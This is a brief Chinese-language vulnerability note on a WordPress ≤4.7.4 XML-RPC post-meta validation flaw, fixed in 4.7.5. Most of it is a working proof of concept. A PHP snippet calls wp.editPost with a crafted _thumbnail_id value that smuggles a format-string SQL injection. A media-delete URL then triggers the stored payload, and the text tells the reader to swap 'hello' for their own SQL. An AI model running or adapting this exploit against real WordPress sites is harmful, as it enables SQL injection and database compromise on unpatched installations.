# WordPress ≤ 4.7.4 XML-RPC API POST META 未校验漏洞
* 官方[https://wordpress.org/news/2017/05/wordpress-4-7-5/](https://wordpress.org/news/2017/05/wordpress-4-7-5/)
* POC来自[https://medium.com/websec/wordpress-sqli-poc-f1827c20bf8e](https://medium.com/websec/wordpress-sqli-poc-f1827c20bf8e)
### POC
```php
    $usr = 'author';
    $pwd = 'author';
    $xmlrpc = 'http://local.target/xmlrpc.php';
    $client = new IXR_Client($xmlrpc);
    $content = array("ID" => 6, 'meta_input' => array("_thumbnail_id"=>"5 %1$%s hello"));
    $res = $client->query('wp.editPost',0, $usr, $pwd, 6/*post_id*/, $content);
```
## Excute The SQL Payload
以管理员的方式登陆

`http://local.target/wp-admin/upload.php`

`local.target/wp-admin/upload.php?_wpnonce=daab7cfabf&action=delete&media%5B%5D=5%20%251%24%25s%20hello`

hello换成我们的Payload
